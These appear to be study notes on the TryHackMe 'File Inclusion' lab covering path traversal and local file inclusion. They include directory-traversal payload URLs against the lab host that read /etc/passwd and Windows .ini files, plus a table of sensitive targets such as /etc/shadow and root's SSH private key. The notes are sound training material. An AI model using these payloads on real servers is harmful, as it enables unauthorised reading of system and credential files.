[TryHackMe | File Inclusion](https://tryhackme.com/room/fileinc)

# TryHackMe-File-Inclusion
'**File Inclusion:**  This room introduces file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal.`

## Task 1 Introduction
![image](https://user-images.githubusercontent.com/58542375/173562517-0fd0332f-1dcf-4eb6-930b-ea733680e0e7.png)

## Task 2 Deploy the VM

## Task 3 Path Traversal
[PHP: file_get_contents - Manual](https://www.php.net/manual/en/function.file-get-contents.php)

![image](https://user-images.githubusercontent.com/58542375/173564652-1c6871a3-35a5-418b-abe1-72241193152e.png)

![image](https://user-images.githubusercontent.com/58542375/173564886-67831530-4ba2-4445-ab51-e538e0af6a93.png)

![image](https://user-images.githubusercontent.com/58542375/173565211-10cb2f8f-3fb7-47a1-ae36-4de62e541d07.png)

*dot-dot-slash attack*

`http://webapp.thm/get.php?file=../../../../etc/passwd`

`http://webapp.thm/get.php?file=../../../../boot.ini`

`http://webapp.thm/get.php?file=../../../../windows/win.ini`

```
C:\Windows>cd ..

C:\>dir *.ini
 Volume in drive C is Windows
 Volume Serial Number is BADE-41F7

 Directory of C:\

File Not Found
```

```
C:\Windows>dir *.ini
 Volume in drive C is Windows
 Volume Serial Number is BADE-41F7

 Directory of C:\Windows

07-Jun-20  03:31 PM            37,625 cfgall.ini
06-Jun-18  02:44 AM               219 system.ini
06-Jun-18  02:44 AM                92 win.ini
               3 File(s)         37,936 bytes
               0 Dir(s)  45,286,510,592 bytes free

C:\Windows>type win.ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

|Location|Description|
|----------|------------|
|/etc/issue| contains a message or system identification to be printed before the login prompt.|
|/etc/profile|controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived|
|/proc/version|specifies the version of the Linux kernel|
|/etc/passwd|has all registered user that has access to a system|
|/etc/shadow|contains information about the system's users' passwords|
|/root/.bash_history|contains the history commands for root user|
|/var/log/dmessage|contains global system messages, including the messages that are logged during system startup|
|/var/mail/root|all emails for root user|
|/root/.ssh/id_rsa|Private SSH keys for a root or any known valid user on the server|
|/var/log/apache2/access.log|the accessed requests for Apache  webserver|
|C:\boot.ini|contains the boot options for computers with BIOS firmware|

## Task 4 Local File Inclusion - LFI
![image](https://user-images.githubusercontent.com/58542375/173569223-618fb0a2-c5c9-4e79-9465-9622322ab422.png)

![image](https://user-images.githubusercontent.com/58542375/173571368-0162dbef-2b3f-41af-918d-c39c119c0773.png)

## Task 5 Local File Inclusion - LFI #2
